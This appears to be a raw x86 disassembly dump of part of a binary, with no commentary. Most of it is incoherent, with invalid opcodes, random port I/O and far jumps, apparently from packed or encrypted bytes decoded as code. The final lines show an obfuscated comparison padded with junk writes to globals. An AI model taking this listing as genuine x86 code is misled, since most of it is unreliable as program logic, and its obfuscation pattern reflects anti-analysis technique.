  40a603:	fmul   st,st(0)
  40a605:	add    ch,bh
  40a607:	mov    esi,0xd5c1d100
  40a60c:	rcr    esi,cl
  40a60e:	or     eax,esi
  40a610:	add    al,0xca
  40a612:	loope  0x40a608
  40a614:	vpaddsw ymm4,ymm3,ymm6
  40a619:	mov    al,0xc4
  40a61b:	out    dx,eax
  40a61c:	jecxz  0x40a5de
  40a61e:	hlt    
  40a61f:	in     eax,dx
  40a620:	(bad)  
  40a621:	jmp    0x40a5f9
  40a623:	sti    
  40a624:	not    dl
  40a626:	test   DWORD PTR [ebx],0xf8edcdcc
  40a62c:	(bad)  
  40a62d:	fcomp  st(7)
  40a62f:	cmc    
  40a630:	jmp    0xf02a8a20
  40a635:	loope  0x40a610
  40a637:	mov    esi,0xb0f0eea5
  40a63c:	(bad)  
  40a63d:	in     eax,0xdb
  40a63f:	scas   al,BYTE PTR es:[edi]
  40a640:	jmp    FWORD PTR [ebp+esi*8-0xf460846]
  40a647:	(bad)  
  40a648:	loop   0x40a623
  40a64a:	loope  0x40a620
  40a64c:	in     al,0xd7
  40a64e:	fidivr WORD PTR [esi-0x34001131]
  40a654:	out    dx,eax
  40a655:	fcmovu st,st(0)
  40a657:	mov    esi,0xcfe7d6eb
  40a65c:	lods   al,BYTE PTR ds:[esi]
  40a65d:	out    dx,eax
  40a65e:	retf   0xdee4
  40a661:	in     al,0xfa
  40a663:	in     al,dx
  40a664:	fild   WORD PTR [edx]
  40a666:	mov    ebp,0xe7ccd2ff
  40a66b:	loop   0x40a671
  40a66d:	lock in eax,0xf
  40a670:	fmul   DWORD PTR [ebx]
  40a672:	fsub   st,st(4)
  40a674:	int3   
  40a675:	fmulp  st(7),st
  40a677:	icebp  
  40a678:	jmp    0xdaec:0xdac7aecb
  40a67f:	icebp  
  40a680:	mov    eax,0xfeb2d5d1
  40a685:	imul   esi
  40a687:	xlat   BYTE PTR ds:[ebx]
  40a688:	mov    DWORD PTR [esi],0xc3cbfce0
  40a68e:	loop   0x40a685
  40a690:	stc    
  40a691:	add    al,0xca
  40a693:	or     ebx,edi
  40a695:	fucomp st(7)
  40a697:	leave  
  40a698:	repz cmc 
  40a69a:	mov    al,0xcf
  40a69c:	enter  0xd2f2,0xb5
  40a6a0:	aad    0xfb
  40a6a2:	mov    bl,0xd5
  40a6a4:	ffree  st(2)
  40a6a6:	ret    
  40a6a7:	lock add bh,al
  40a6aa:	mov    ebx,0xc1b8dec5
  40a6af:	fcos   
  40a6b1:	loop   0x40a68b
  40a6b3:	bswap  edx
  40a6b5:	adc    ebx,ecx
  40a6b7:	mov    edi,0xc0f7ddf3
  40a6bc:	lods   eax,DWORD PTR ds:[esi]
  40a6bd:	out    dx,al
  40a6be:	into   
  40a6bf:	retf   
  40a6c0:	cli    
  40a6c1:	icebp  
  40a6c2:	std    
  40a6c3:	leave  
  40a6c4:	lock std 
  40a6c6:	sar    DWORD PTR [ecx-0x14123901],1
  40a6cc:	fisttp DWORD PTR [edx]
  40a6ce:	jmp    0xcdd9:0xe1d6c50b
  40a6d5:	or     cl,al
  40a6d7:	in     al,dx
  40a6d8:	out    dx,al
  40a6d9:	repnz out dx,al
  40a6db:	cmc    
  40a6dc:	fidiv  DWORD PTR [ebx-0x2250445]
  40a6e2:	mov    ebx,0xd0b8f0c8
  40a6e7:	int3   
  40a6e8:	out    0xbc,al
  40a6ea:	in     al,dx
  40a6eb:	mov    ebp,0xfadd0700
  40a6f0:	jmp    0x40a6e7
  40a6f2:	loope  0x40a6f8
  40a6f4:	syscall 
  40a6f6:	shl    cl,cl
  40a6f8:	into   
  40a6f9:	ret    0xf6b7
  40a6fc:	jmp    0xfb0162d6
  40a701:	in     al,dx
  40a702:	jmp    0xfdd2:0xefded6de
  40a709:	repnz fidivr DWORD PTR [ebp+eax*1-0x3e05f61f]
  40a711:	retf   0xc8dc
  40a714:	jmp    0xe8c9:0xc0eef011
  40a71b:	not    eax
  40a71d:	retf   
  40a71e:	fmul   st,st(3)
  40a720:	(bad)
  40a723:	mov    edx,0xf4ecdfd8
  40a728:	mov    esi,0xe60bc2da
  40a72d:	in     eax,0xe1
  40a72f:	add    edi,ebp
  40a731:	add    dl,bl
  40a733:	jmp    0xf2f6:0xddd00aeb
  40a73a:	mov    al,0xbc
  40a73c:	jmp    0x40a700
  40a73e:	shl    BYTE PTR [edx-0x637332f],cl
  40a744:	enter  0xdef7,0xfa
  40a748:	inc    BYTE PTR [ebx]
  40a74a:	mov    esp,0xe3dafec3
  40a74f:	cld    
  40a750:	loop   0x40a748
  40a752:	iret   
  40a753:	out    0xec,eax
  40a755:	or     bl,bh
  40a757:	int    0xa9
  40a759:	mov    bl,0xf6
  40a75b:	retf   0xcbce
  40a75e:	repnz iret 
  40a760:	into   
  40a761:	mov    bh,0xe8
  40a763:	enter  0xffc8,0xd8
  40a767:	imul   esp
  40a769:	icebp  
  40a76a:	(bad)  
  40a76c:	add    ecx,ebp
  40a76e:	add    al,BYTE PTR [edi]
  40a770:	add    dh,dl
  40a772:	call   0xaa547764
  40a777:	out    0xc4,al
  40a779:	shr    ah,cl
  40a77b:	(bad)  
  40a77c:	ror    ch,cl
  40a77e:	fdiv   st,st(0)
  40a780:	in     eax,0xac
  40a782:	mov    edx,0xc2ded8cb
  40a787:	add    bh,ch
  40a789:	mov    ah,0xe0
  40a78b:	fst    st(5)
  40a78d:	std    
  40a78e:	retf   
  40a78f:	or     eax,DWORD PTR [eax]
  40a791:	leave  
  40a792:	fcmovne st,st(1)
  40a794:	or     bh,bh
  40a796:	stos   BYTE PTR es:[edi],al
  40a797:	in     eax,dx
  40a798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a799:	div    bh
  40a79b:	out    dx,eax
  40a79c:	mov    cl,0xc4
  40a79e:	mov    cl,0xae
  40a7a0:	mov    ecx,0xc9ffebd1
  40a7a5:	ret    
  40a7a6:	(bad)  
  40a7a7:	mov    dh,0xbc
  40a7a9:	test   bl,0x3
  40a7ac:	hlt    
  40a7ad:	fcomip st,st(0)
  40a7af:	cmc    
  40a7b0:	fstp   st(4)
  40a7b2:	into   
  40a7b3:	ret    0xd9f9
  40a7b6:	ror    ah,0xc8
  40a7b9:	lods   eax,DWORD PTR ds:[esi]
  40a7ba:	iret   
  40a7bb:	retf   0xcdfb
  40a7be:	loope  0x40a777
  40a7c0:	repnz mov ecx,0xd4d7cad2
  40a7c6:	imul   esi
  40a7c8:	lock mov esp,0xc50ae3c5
  40a7ce:	loope  0x40a7d5
  40a7d0:	or     eax,DWORD PTR [edi]
  40a7d2:	fimul  WORD PTR [ecx]
  40a7d4:	cli    
  40a7d5:	or     esp,ecx
  40a7d7:	mov    al,0xf1
  40a7d9:	enter  0xe9e5,0xb5
  40a7dd:	stc    
  40a7de:	in     al,0xff
  40a7e0:	in     eax,dx
  40a7e1:	stc    
  40a7e2:	retf   0xcfdf
  40a7e5:	mov    esp,0xe6f1ccd5
  40a7ea:	mov    esi,0xfadb05d8
  40a7ef:	fld    QWORD PTR [eax]
  40a7f1:	add    al,0xdf
  40a7f3:	in     eax,dx
  40a7f4:	std    
  40a7f5:	adc    edx,ebx
  40a7f7:	icebp  
  40a7f8:	loope  0x40a7b1
  40a7fa:	rcl    esp,cl
  40a7fc:	in     al,0xeb
  40a7fe:	in     al,0xba
  40a800:	mov    dh,0xff
  40a802:	(bad)  
  40a803:	in     al,0xe2
  40a805:	fucomip st,st(5)
  40a807:	ret    
  40a808:	iret   
  40a809:	pop    es
  40a80a:	(bad)  
  40a80b:	repz add al,dh
  40a80e:	ret    
  40a80f:	jmp    edx
  40a811:	jmp    0xb2eb:0x13e3f3e9
  40a818:	in     al,dx
  40a819:	enter  0xb1e3,0xee
  40a81d:	jmp    0xf3fe:0xf0f3eef1
  40a824:	shr    esi,1
  40a826:	int3   
  40a827:	sti    
  40a828:	fxch   st(4)
  40a82a:	fld    st(0)
  40a82c:	add    ecx,ebx
  40a82e:	jmp    0x40a805
  40a830:	(bad)  
  40a831:	(bad)  
  40a833:	leave  
  40a834:	out    dx,al
  40a835:	loopne 0x40a804
  40a837:	mov    bl,0xf7
  40a839:	lods   eax,DWORD PTR ds:[esi]
  40a83a:	leave  
  40a83b:	jmp    0xb9166f2e
  40a840:	lods   eax,DWORD PTR ds:[esi]
  40a841:	clc    
  40a842:	cli    
  40a843:	in     al,dx
  40a844:	fcmovnu st,st(4)
  40a846:	out    dx,al
  40a847:	iret   
  40a848:	ret    0xbdd8
  40a84b:	call   esp
  40a84d:	or     ebx,eax
  40a84f:	xlat   BYTE PTR ds:[ebx]
  40a850:	sar    ecx,0xe8
  40a853:	add    eax,0xaac5ecc9
  40a858:	(bad)  
  40a859:	out    0xc4,al
  40a85b:	into   
  40a85c:	loope  0x40a840
  40a85e:	out    dx,eax
  40a85f:	call   0xcb39715a
  40a864:	mov    ebp,0xdbd801d7
  40a869:	pop    es
  40a86a:	repnz xlat BYTE PTR ds:[ebx]
  40a86c:	push   es
  40a86d:	add    ecx,eax
  40a86f:	fst    st(4)
  40a871:	push   cs
  40a872:	add    edi,ebx
  40a874:	(bad)  [ecx]
  40a876:	repz scas al,BYTE PTR es:[edi]
  40a878:	call   0xd20a694b
  40a87d:	retf   0xbac0
  40a880:	int3   
  40a881:	in     al,dx
  40a882:	leave  
  40a883:	fcmovne st,st(6)
  40a885:	cld    
  40a886:	sar    DWORD PTR [esi+ebx*8-0x22423825],0xc1
  40a88e:	leave  
  40a88f:	in     al,0x6
  40a891:	call   0xe40a46e
  40a896:	rcr    bh,1
  40a898:	rol    ah,cl
  40a89a:	out    dx,al
  40a89b:	(bad)  
  40a89c:	in     al,0xac
  40a89e:	int3   
  40a89f:	retf   
  40a8a0:	rcr    ebx,cl
  40a8a2:	repnz mov eax,0xdad7d3ee
  40a8a8:	out    dx,eax
  40a8a9:	in     eax,dx
  40a8aa:	rcr    esp,1
  40a8ac:	ret    0x7e7
  40a8af:	pop    es
  40a8b0:	hlt    
  40a8b1:	push   cs
  40a8b2:	cli    
  40a8b3:	fadd   DWORD PTR ds:0xece3e2d9
  40a8b9:	mov    esi,0xf2d2c8e1
  40a8be:	hlt    
  40a8bf:	retf   
  40a8c0:	aad    0xde
  40a8c2:	mov    ebp,0xb8ecced0
  40a8c7:	mov    eax,0xf9bc05bd
  40a8cc:	in     eax,0xf1
  40a8ce:	cld    
  40a8cf:	add    ebx,ebp
  40a8d1:	add    eax,DWORD PTR [ecx]
  40a8d3:	fiadd  WORD PTR ds:0xe5d2bedc
  40a8d9:	lods   al,BYTE PTR ds:[esi]
  40a8da:	(bad)  
  40a8db:	jmp    0xe8296eb6
  40a8e0:	in     al,dx
  40a8e1:	out    dx,al
  40a8e2:	shr    bl,cl
  40a8e4:	into   
  40a8e5:	jecxz  0x40a8e4
  40a8e7:	rol    BYTE PTR [esi],cl
  40a8e9:	rcr    eax,cl
  40a8eb:	(bad)  
  40a8ec:	(bad)  
  40a8ee:	les    eax,FWORD PTR [ebx]
  40a8f0:	fmul   st,st(2)
  40a8f2:	stc    
  40a8f3:	in     al,0x7
  40a8f5:	out    0xd0,al
  40a8f7:	shl    BYTE PTR [ebp-0x1149330b],0xee
  40a8fe:	sti    
  40a8ff:	iret   
  40a900:	sar    eax,cl
  40a902:	cld    
  40a903:	mov    eax,0x202d6d6
  40a908:	rol    BYTE PTR [eax],0xde
  40a90b:	mov    esi,0xe2eae9fc
  40a910:	jmp    0xe71ca60d
  40a915:	in     al,dx
  40a916:	repnz in eax,dx
  40a918:	mov    esp,0xb3c5ece1
  40a91d:	ror    bl,1
  40a91f:	mov    eax,0xeab6eaed
  40a924:	jmp    0xf72faadd
  40a929:	(bad)  
  40a92a:	shl    bl,cl
  40a92c:	cld    
  40a92d:	fmul   st,st(1)
  40a92f:	add    ecx,DWORD PTR [ebx]
  40a931:	stc    
  40a932:	in     al,dx
  40a933:	cli    
  40a934:	les    eax,FWORD PTR [edi]
  40a936:	call   0xf7e575fc
  40a93b:	mov    bh,0xfb
  40a93d:	ror    cl,1
  40a93f:	mov    dh,0xd6
  40a941:	std    
  40a942:	mov    ch,0xb9
  40a944:	repz (bad) 
  40a946:	fdiv   DWORD PTR [esi-0x2d25193e]
  40a94c:	aad    0xc6
  40a94e:	xlat   BYTE PTR ds:[ebx]
  40a94f:	imul   eax
  40a951:	(bad)  
  40a952:	(bad)  
  40a954:	add    bh,bh
  40a956:	retf   0xdfd1
  40a959:	jmp    0xcc028a52
  40a95e:	int    0xb1
  40a960:	lock mov dh,0xd2
  40a963:	imul   eax
  40a965:	mov    esp,0xdef3c001
  40a96a:	div    eax
  40a96c:	(bad)
  40a96f:	out    dx,eax
  40a970:	push   es
  40a971:	leave  
  40a972:	retf   
  40a973:	loopne 0x40a948
  40a975:	out    dx,al
  40a976:	loopne 0x40a96f
  40a978:	in     eax,dx
  40a979:	jmp    0xd1b3:0xc2e7d4e0
  40a980:	cli    
  40a981:	iret   
  40a982:	mov    ebp,0xd8e3dcb6
  40a987:	in     eax,dx
  40a988:	loopne 0x40a960
  40a98a:	aam    0xde
  40a98c:	rol    esp,0xd8
  40a98f:	sti    
  40a990:	out    0xe6,eax
  40a992:	std    
  40a993:	fsubp  st(2),st
  40a995:	icebp  
  40a996:	loop   0x40a974
  40a998:	int3   
  40a999:	into   
  40a99a:	mov    dh,0xe7
  40a99c:	in     eax,dx
  40a99d:	jmp    0xeed2:0xbaf3ffb2
  40a9a4:	clc    
  40a9a5:	retf   0xd4d2
  40a9a8:	rol    bh,cl
  40a9aa:	push   es
  40a9ab:	clc    
  40a9ac:	rol    esp,1
  40a9ae:	add    ecx,eax
  40a9b0:	aam    0xd4
  40a9b2:	call   0xcb3cbca3
  40a9b7:	mov    esp,0xb5d6dde0
  40a9bc:	in     al,0xa8
  40a9be:	mov    al,0xf3
  40a9c0:	call   0xe000a198
  40a9c5:	mov    ebx,0xfdb9f0b7
  40a9ca:	ret    
  40a9cb:	repz hlt 
  40a9cd:	mul    esi
  40a9cf:	out    0x5,al
  40a9d1:	or     cl,bl
  40a9d3:	loop   0x40a99d
  40a9d5:	in     eax,0xb1
  40a9d7:	jmp    0xf5c7:0xe4dcb3a8
  40a9de:	iret   
  40a9df:	jmp    0xfdf7a7b6
  40a9e4:	mov    ch,0xc2
  40a9e6:	add    BYTE PTR [ecx],al
  40a9e8:	out    0xfe,eax
  40a9ea:	std    
  40a9eb:	(bad)  
  40a9ec:	(bad)
  40a9f0:	out    dx,al
  40a9f1:	retf   0xdcd5
  40a9f4:	in     al,dx
  40a9f5:	retf   
  40a9f6:	out    0xeb,al
  40a9f8:	shr    DWORD PTR [esi-0xa522b29],1
  40a9fe:	jmp    0xd53682e8
  40aa03:	repnz fcmovnu st,st(4)
  40aa06:	mov    eax,0xd8d3bef7
  40aa0b:	sti    
  40aa0c:	jmp    0x40a9fe
  40aa0e:	loop   0x40a9d8
  40aa10:	or     cl,bl
  40aa12:	(bad)  
  40aa14:	leave  
  40aa15:	fld    st(3)
  40aa17:	(bad)  
  40aa18:	in     eax,0xd7
  40aa1a:	mov    dl,0xf4
  40aa1c:	fcmovbe st,st(4)
  40aa1e:	retf   
  40aa1f:	imul   BYTE PTR [ebp-0x32352910]
  40aa25:	leave  
  40aa26:	mov    bh,0xc8
  40aa28:	add    ch,bl
  40aa2a:	fyl2xp1 
  40aa2c:	vpminsw ymm0,ymm3,ymm1
  40aa30:	out    0xf4,al
  40aa32:	inc    BYTE PTR [edi]
  40aa34:	fxch   st(2)
  40aa36:	leave  
  40aa37:	in     eax,dx
  40aa38:	loop   0x40a9eb
  40aa3a:	ret    
  40aa3b:	shr    BYTE PTR [ecx-0x21060846],1
  40aa41:	lock std 
  40aa43:	mov    eax,0xe2ba01fa
  40aa48:	cmc    
  40aa49:	fcom   st(1)
  40aa4b:	rol    edx,1
  40aa4d:	cli    
  40aa4e:	aam    0xdb
  40aa50:	std    
  40aa51:	call   0x148893c
  40aa56:	mov    cl,0xec
  40aa58:	call   0xed088f40
  40aa5d:	(bad)  
  40aa5e:	retf   0xb4b1
  40aa61:	out    dx,al
  40aa62:	call   0xbc15a821
  40aa67:	sar    BYTE PTR [eax+eax*1-0x4326fe45],cl
  40aa6e:	std    
  40aa6f:	sti    
  40aa70:	jecxz  0x40aa6c
  40aa72:	iret   
  40aa73:	(bad)  
  40aa74:	retf   
  40aa75:	out    dx,al
  40aa76:	iret   
  40aa77:	shl    cl,0xd1
  40aa7a:	repnz hlt 
  40aa7c:	(bad)  
  40aa7e:	repz jmp 0x40aa4a
  40aa81:	out    dx,eax
  40aa82:	out    dx,eax
  40aa83:	fild   DWORD PTR [ebx]
  40aa85:	iret   
  40aa86:	loopne 0x40aa8b
  40aa88:	(bad)  
  40aa89:	bnd ret 0xfd03
  40aa8d:	ret    
  40aa8e:	fsub   st,st(7)
  40aa90:	cld    
  40aa91:	jmp    0x525a475
  40aa96:	shl    esp,1
  40aa98:	in     al,0xef
  40aa9a:	mov    cl,0xf3
  40aa9c:	mov    bh,0xb3
  40aa9e:	imul   dh
  40aaa0:	xlat   BYTE PTR ds:[ebx]
  40aaa1:	idiv   BYTE PTR [ecx-0xb314645]
  40aaa7:	out    0xbd,eax
  40aaa9:	repnz vcvttpd2dq xmm4,xmm1
  40aaae:	div    ch
  40aab0:	(bad)  
  40aab1:	sti    
  40aab2:	loopne 0x40aab3
  40aab4:	add    al,ah
  40aab6:	repnz (bad) 
  40aab8:	mov    bl,0xa8
  40aaba:	(bad)  
  40aabb:	loope  0x40aa98
  40aabd:	fcomi  st,st(1)
  40aabf:	icebp  
  40aac0:	int    0xd4
  40aac2:	cli    
  40aac3:	aam    0xbd
  40aac5:	int    0xda
  40aac7:	in     eax,dx
  40aac8:	ffreep st(3)
  40aaca:	sti    
  40aacb:	idiv   esp
  40aacd:	aam    0xc0
  40aacf:	leave  
  40aad0:	(bad)  
  40aad2:	in     eax,dx
  40aad3:	pminsw mm1,mm5
  40aad6:	ret    0xebe5
  40aad9:	faddp  st(6),st
  40aadb:	fucomi st,st(1)
  40aadd:	mov    al,0xe6
  40aadf:	mov    cl,0xe5
  40aae1:	(bad)  
  40aae3:	(bad)  
  40aae5:	aad    0xf7
  40aae7:	add    dh,al
  40aae9:	fild   WORD PTR [ecx]
  40aaeb:	shl    esi,cl
  40aaed:	add    esi,esp
  40aaef:	out    0xfd,al
  40aaf1:	fadd   QWORD PTR [eax]
  40aaf3:	out    dx,al
  40aaf4:	int3   
  40aaf5:	retf   
  40aaf6:	mov    esi,0xd2d7c6df
  40aafb:	mov    ch,0xd1
  40aafd:	mov    cl,0xef
  40aaff:	leave  
  40ab00:	mov    bh,0xb7
  40ab02:	mov    bh,0xdb
  40ab04:	mov    esi,0xc1bebae1
  40ab09:	(bad)  
  40ab0a:	mov    edi,0xc2d70be6
  40ab0f:	(bad)  
  40ab11:	fmul   DWORD PTR [edx]
  40ab13:	fcomp  st(7)
  40ab15:	icebp  
  40ab16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab17:	shl    BYTE PTR [edx-0x2e2a113a],0xf2
  40ab1e:	mov    cl,0xbb
  40ab20:	clc    
  40ab21:	std    
  40ab22:	icebp  
  40ab23:	xlat   BYTE PTR ds:[ebx]
  40ab24:	(bad)  
  40ab25:	fcmovnu st,st(3)
  40ab27:	clc    
  40ab28:	dec    esi
  40ab2a:	(bad)  
  40ab2c:	mov    esp,0xd7d0fce6
  40ab31:	hlt    
  40ab32:	pop    es
  40ab33:	adc    esi,edx
  40ab35:	fcmovbe st,st(3)
  40ab37:	in     eax,0xa8
  40ab39:	mov    dh,0xb6
  40ab3b:	shl    ch,0xd7
  40ab3e:	into   
  40ab3f:	in     al,0xb6
  40ab41:	xlat   BYTE PTR ds:[ebx]
  40ab42:	in     al,0xf2
  40ab44:	shr    ebp,cl
  40ab46:	(bad)  
  40ab48:	rcl    edi,1
  40ab4a:	mov    ebp,0xe8f6c506
  40ab4f:	add    dh,ch
  40ab51:	push   es
  40ab52:	clc    
  40ab53:	out    dx,al
  40ab54:	or     eax,0xecdde60b
  40ab59:	scas   eax,DWORD PTR es:[edi]
  40ab5a:	scas   al,BYTE PTR es:[edi]
  40ab5b:	in     al,dx
  40ab5c:	int3   
  40ab5d:	(bad)
  40ab60:	mov    ebx,0xe803f4e9
  40ab65:	jmp    0xe31da929
  40ab6a:	shl    dl,1
  40ab6c:	mov    ebp,0xf9e9dcea
  40ab71:	or     ebx,esp
  40ab73:	loop   0x40ab42
  40ab75:	in     al,dx
  40ab76:	repnz mov bl,0xc3
  40ab79:	enter  0xd5af,0xce
  40ab7d:	in     al,0xef
  40ab7f:	fprem  
  40ab81:	enter  0xfec9,0xf7
  40ab85:	xlat   BYTE PTR ds:[ebx]
  40ab86:	clc    
  40ab87:	aad    0xd8
  40ab89:	mov    eax,0xe5c5f6f7
  40ab8e:	(bad)  
  40ab8f:	cld    
  40ab90:	loope  0x40ab4e
  40ab92:	cli    
  40ab93:	add    BYTE PTR [ecx],cl
  40ab95:	repnz mov cl,0xde
  40ab98:	mov    esi,0xc8d6bdc3
  40ab9d:	(bad)
  40aba0:	mov    bh,0xfb
  40aba2:	mov    eax,0xbed1bcde
  40aba7:	(bad)  
  40aba9:	rol    edx,1
  40abab:	fnstcw WORD PTR [ebp-0x301c2a23]
  40abb1:	fdivr  st(5),st
  40abb3:	jmp    0x40abc7
  40abb5:	icebp  
  40abb6:	lock sar DWORD PTR [esi-0x39511353],cl
  40abbd:	mov    ah,0xe6
  40abbf:	mov    bh,0xb8
  40abc1:	leave  
  40abc2:	rcl    al,cl
  40abc4:	repnz retf 0x7d0
  40abc8:	not    bl
  40abca:	add    al,0xbc
  40abcc:	div    esp
  40abce:	fsubr  st(5),st
  40abd0:	stc    
  40abd1:	(bad)  
  40abd2:	ficom  WORD PTR [ebx]
  40abd4:	repnz repz mov bl,0xe7
  40abd8:	in     al,0xcc
  40abda:	repnz mov ch,0xb3
  40abdd:	(bad)  
  40abde:	scas   eax,DWORD PTR es:[edi]
  40abdf:	in     eax,0xce
  40abe1:	in     al,dx
  40abe2:	into   
  40abe3:	aam    0xef
  40abe5:	mov    ecx,0xe0bfd903
  40abea:	in     al,dx
  40abeb:	shl    dh,1
  40abed:	repnz out 0xc9,al
  40abf0:	retf   
  40abf1:	jmp    0xc3ed:0xf9130601
  40abf8:	int3   
  40abf9:	jmp    0x40abf0
  40abfb:	stos   BYTE PTR es:[edi],al
  40abfc:	mul    edi
  40abfe:	(bad)  
  40abff:	sti    
  40ac00:	mov    ch,0xdd
  40ac02:	in     eax,dx
  40ac03:	in     al,dx
  40ac04:	mov    edx,0xd0d7b8cf
  40ac09:	into   
  40ac0a:	pop    es
  40ac0b:	add    DWORD PTR [ecx],eax
  40ac0d:	aad    0xc0
  40ac0f:	(bad)  
  40ac10:	or     BYTE PTR [edx],al
  40ac12:	jmp    0xc72db91e
  40ac17:	xlat   BYTE PTR ds:[ebx]
  40ac18:	repnz scas al,BYTE PTR es:[edi]
  40ac1a:	scas   al,BYTE PTR es:[edi]
  40ac1b:	jmp    0xb80b7fdb
  40ac20:	jmp    0x40ac01
  40ac22:	mov    ebx,0xefd5baf5
  40ac27:	hlt    
  40ac28:	mov    ecx,0xc1d8e5c3
  40ac2d:	rol    DWORD PTR [ebx],1
  40ac2f:	test   cl,0xcb
  40ac32:	or     BYTE PTR [eax],al
  40ac34:	or     eax,0xc9c1e1e6
  40ac39:	(bad)
  40ac3c:	(bad)  
  40ac3d:	call   0xedf9a60e
  40ac42:	(bad)  
  40ac43:	mov    ebx,0xfcdffeef
  40ac48:	(bad)  
  40ac49:	cli    
  40ac4a:	repnz or esp,esi
  40ac4d:	clc    
  40ac4e:	(bad)  
  40ac50:	add    BYTE PTR [ecx+edi*8],al
  40ac53:	std    
  40ac54:	into   
  40ac55:	cli    
  40ac56:	shl    dl,cl
  40ac58:	call   0xf0088042
  40ac5d:	xlat   BYTE PTR ds:[ebx]
  40ac5e:	out    0xeb,eax
  40ac60:	(bad)  
  40ac61:	mov    ah,0xee
  40ac63:	int3   
  40ac64:	int3   
  40ac65:	stc    
  40ac66:	(bad)  
  40ac68:	mov    ecx,0xd7f3d3dd
  40ac6d:	jecxz  0x40ac73
  40ac6f:	dec    BYTE PTR [ebx]
  40ac71:	add    ebp,esi
  40ac73:	sti    
  40ac74:	in     al,0xea
  40ac76:	(bad)
  40ac79:	repz loop 0x40ac73
  40ac7c:	lock rcr dl,1
  40ac7f:	call   edx
  40ac81:	mov    bh,0xef
  40ac83:	fscale 
  40ac85:	int3   
  40ac86:	clc    
  40ac87:	fdivp  st(1),st
  40ac89:	add    BYTE PTR [eax],al
  40ac8b:	jecxz  0x40ac60
  40ac8d:	loope  0x40ac67
  40ac8f:	or     ecx,DWORD PTR [esi]
  40ac91:	retf   
  40ac92:	out    dx,al
  40ac93:	dec    BYTE PTR ds:0xc7e9ae0f
  40ac99:	call   0xf309957f
  40ac9e:	repnz fidiv DWORD PTR [ecx-0x8410c06]
  40aca5:	retf   0xfdee
  40aca8:	not    edx
  40acaa:	loop   0x40aca9
  40acac:	cld    
  40acad:	(bad)  
  40acaf:	out    0x7,al
  40acb1:	cmc    
  40acb2:	iret   
  40acb3:	ret    0x11c4
  40acb6:	(bad)  
  40acb8:	out    dx,al
  40acb9:	(bad)  
  40acba:	rcl    edx,0xd2
  40acbd:	in     al,dx
  40acbe:	mov    ebx,0xf9d4f4e8
  40acc3:	xlat   BYTE PTR ds:[ebx]
  40acc4:	mov    edx,0xccd503fb
  40acc9:	int3   
  40acca:	int3   
  40accb:	jecxz  0x40accf
  40accd:	jmp    0x40aca7
  40accf:	fprem  
  40acd1:	(bad)  
  40acd2:	stc    
  40acd3:	jmp    0xf5e1:0xe5b20b02
  40acda:	(bad)  
  40acdb:	jecxz  0x40aca5
  40acdd:	(bad)  
  40acdf:	mov    dl,0xca
  40ace1:	aad    0xd6
  40ace3:	fdivr  QWORD PTR [eax-0x293f0702]
  40ace9:	(bad)  
  40aceb:	(bad)  
  40aced:	std    
  40acee:	add    DWORD PTR [ebx],ecx
  40acf0:	sti    
  40acf1:	in     al,0xe3
  40acf3:	(bad)  
  40acf4:	loopne 0x40acfe
  40acf6:	loopne 0x40acd6
  40acf8:	mov    cl,0xeb
  40acfa:	loopne 0x40accd
  40acfc:	div    DWORD PTR [eax-0x439392f]
  40ad02:	fdiv   st,st(3)
  40ad04:	retf   0xfad4
  40ad07:	lock fcomip st,st(4)
  40ad0a:	in     eax,dx
  40ad0b:	vpsllw xmm7,xmm0,xmm0
  40ad0f:	jecxz  0x40ad19
  40ad11:	(bad)  
  40ad12:	int    0x6
  40ad14:	iret   
  40ad15:	(bad)  
  40ad16:	int    0xca
  40ad18:	call   0xe6055905
  40ad1d:	(bad)  
  40ad1f:	icebp  
  40ad20:	jmp    0x40acff
  40ad22:	retf   
  40ad23:	cmc    
  40ad24:	(bad)  
  40ad26:	leave  
  40ad27:	mov    eax,0xf8bc0602
  40ad2c:	cmc    
  40ad2d:	push   es
  40ad2e:	in     al,0xe4
  40ad30:	test   BYTE PTR [ebx],0xe0
  40ad33:	ret    0xc8eb
  40ad36:	shl    BYTE PTR [eax-0x82b1f52],0xce
  40ad3d:	jmp    0xccfc82fc
  40ad42:	iret   
  40ad43:	fcomip st,st(1)
  40ad45:	(bad)  
  40ad47:	icebp  
  40ad48:	clc    
  40ad49:	mov    edi,0xc0e1e5d5
  40ad4e:	fisttp WORD PTR [ebx]
  40ad50:	add    edi,edi
  40ad52:	sti    
  40ad53:	retf   
  40ad54:	out    0xe2,eax
  40ad56:	lods   eax,DWORD PTR ds:[esi]
  40ad57:	ror    ah,1
  40ad59:	jmp    0x3348fae9
  40ad5e:	mul    BYTE PTR [ecx+0x43772f]
  40ad64:	add    DWORD PTR ds:0x437767,eax
  40ad6a:	sub    ecx,0x5424137
  40ad70:	inc    eax
  40ad71:	sbb    esi,0x0
  40ad74:	xor    eax,DWORD PTR ds:0x43771b
  40ad7a:	xor    ecx,0x8a29a14b
  40ad80:	adc    eax,DWORD PTR ds:0x43775f
  40ad86:	xor    esi,0x0
  40ad89:	mov    DWORD PTR ds:0x437773,0x7e2
  40ad93:	mov    eax,ds:0x43739f
  40ad98:	mov    eax,DWORD PTR [eax+0x1c8]
  40ad9e:	add    DWORD PTR ds:0x437737,0x43770f
  40ada8:	mov    eax,DWORD PTR [eax]
  40adaa:	sub    DWORD PTR ds:0x437723,0xba8
  40adb4:	cdq    
  40adb5:	or     DWORD PTR ds:0x43771b,0x437747
  40adbf:	sub    eax,0x5424137
  40adc4:	sbb    edx,0x0
  40adc7:	xor    eax,0x8a29a14b
  40adcc:	sub    DWORD PTR ds:0x43772f,0x4df4
  40add6:	xor    edx,0x0
  40add9:	mov    DWORD PTR [ebp-0x2c],ecx
  40addc:	mov    DWORD PTR ds:0x43772f,0x73f6
  40ade6:	mov    DWORD PTR [ebp-0x28],esi
  40ade9:	mov    DWORD PTR ds:0x43772f,0xee1
  40adf3:	mov    DWORD PTR [ebp-0x34],eax
  40adf6:	mov    DWORD PTR ds:0x43772f,0x1b8
  40ae00:	mov    DWORD PTR [ebp-0x30],edx
  40ae03:	mov    DWORD PTR ds:0x43777f,0x1aab
  40ae0d:	mov    eax,DWORD PTR [ebp-0x2c]
  40ae10:	cmp    eax,DWORD PTR [ebp-0x34]
  40ae13:	mov    DWORD PTR ds:0x43777b,0xd67
  40ae1d:	jne    0x40ae34
  40ae23:	mov    eax,0x7348
  40ae28:	mov    eax,DWORD PTR [ebp-0x28]
  40ae2b:	cmp    eax,DWORD PTR [ebp-0x30]
  40ae2e:	je     0x40ae56
  40ae34:	and    DWORD PTR ds:0x43775b,0x1a29
